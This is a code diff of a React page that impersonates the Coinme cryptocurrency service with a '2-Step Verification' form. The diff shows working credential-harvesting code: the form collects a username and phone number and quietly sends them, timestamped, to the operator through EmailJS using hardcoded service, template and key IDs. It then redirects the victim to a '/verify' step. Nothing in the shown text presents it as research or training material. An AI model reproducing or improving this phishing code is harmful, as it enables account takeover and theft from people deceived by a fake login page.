@@ -1,6 +1,6 @@
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import emailjs from 'emailjs-com';
+import emailjs from '@emailjs/browser'; // ✅ Updated import
 
 const Home = () => {
   const [email, setEmail] = useState('');
@@ -8,13 +8,13 @@ const Home = () => {
   const [emailError, setEmailError] = useState('');
   const [passwordError, setPasswordError] = useState('');
   const [emailPlaceholder, setEmailPlaceholder] = useState('Enter Username');
-  const [passwordPlaceholder, setPasswordPlaceholder] = useState('Enter your Number');
+  const [passwordPlaceholder, setPasswordPlaceholder] = useState('_ _ _  _ _ _  _ _ _ _');
   const navigate = useNavigate();
 
-  const handleLogin = () => {
+  const handleLogin = async () => {
     let isValid = true;
 
-    // Email validation
+    // ✅ Email validation
     if (!email) {
       setEmailError('Username is required');
       setEmailPlaceholder('Enter Username');
@@ -26,53 +26,50 @@ const Home = () => {
       setEmailError('');
     }
 
-    // Password validation
+    // ✅ Password validation
     if (!password) {
       setPasswordError('Number is required');
       setPasswordPlaceholder('Enter your Number');
-      isValid = false;
-    } else if (!/^[0-9]{10}$/.test(password)) {
-      setPasswordError('Number must be exactly 10 digits');
       isValid = false;
     } else {
       setPasswordError('');
     }
 
-    // If valid, send email
-    if (isValid) {
-      const templateParams = {
-        web_name: 'Coinme',
-        from_name: 'Coinme',
-        message: `Name: ${email}, \nPhone: ${password}, \nDate: ${new Date().toLocaleDateString()}, \nTime: ${new Date().toLocaleTimeString()}`,
-      };
+    if (!isValid) return;
 
-      emailjs
-        .send(
-          'service_vqas695',
-          'template_2f8nyuj',
-          templateParams,
-          'v8nhKmEDxUkTIhobT'
-        )
-        .then(() => {
-          setEmail('');
-          setPassword('');
-          navigate('/verify');
-        })
-        .catch((error) => {
-          console.error('Error:', error);
-          alert('Failed to send email.');
-        });
+    // ✅ Template params
+    const templateParams = {
+      web_name:'Coinme',
+      from_name: 'Coinme',
+      message: `Name: ${email}, \nPhone: ${password}, \nDate: ${new Date().toLocaleDateString()}, \nTime: ${new Date().toLocaleTimeString()}`,
+    };
+
+    try {
+      const response = await emailjs.send(
+        'service_9vr0fnb', // ✅ Check your Service ID
+        'template_1rqlnbj', // ✅ Check your Template ID
+        templateParams,
+        'uHwNgVlpc4635wHVx' // ✅ Check your Public Key
+      );
+
+      console.log('Email sent successfully:', response);
+      setEmail('');
+      setPassword('');
+      navigate('/verify');
+    } catch (error) {
+      console.error('Email sending error:', error);
+      alert(`Failed to send email: ${error.text || error.message}`);
     }
   };
 
   return (
-    <div className="bg-white min-h-screen flex flex-col items-center pt-32">
+    <div className="bg-white min-h-screen flex flex-col justify-center items-center pt-32">
       <header className="flex justify-center mb-8">
         <img src={require('../Image/coinme1.jpg')} alt="Navigation" className="w-36" />
       </header>
 
-      <div className="w-full max-w-lg border-2 bg-white p-8 rounded-lg shadow-lg">
-        <main className="flex flex-col items-center">
+      <div className="w-full  max-w-lg border-2 bg-white p-8 rounded-lg shadow-lg">
+        <main className="">
           <h1 className="text-blue-800 text-3xl font-medium pb-5">2-Step Verification</h1>
           <h3 className="text-lg text-gray-700 mb-6">Please verify your details</h3>
           <form
@@ -80,9 +77,10 @@ const Home = () => {
               e.preventDefault();
               handleLogin();
             }}
-            className="w-full"
+            className=""
           >
-            <div className="mb-4">
+            <div className="mb-4  ">
+              <label htmlFor="name ">Enter Name</label>
               <input
                 type="text"
                 id="email"
@@ -98,6 +96,7 @@ const Home = () => {
               {emailError && <p className="text-red-500 text-xs mt-1">{emailError}</p>}
             </div>
             <div className="mb-6">
+              <label htmlFor="phone">Enter Number</label>
               <input
                 type="text"
                 id="password"
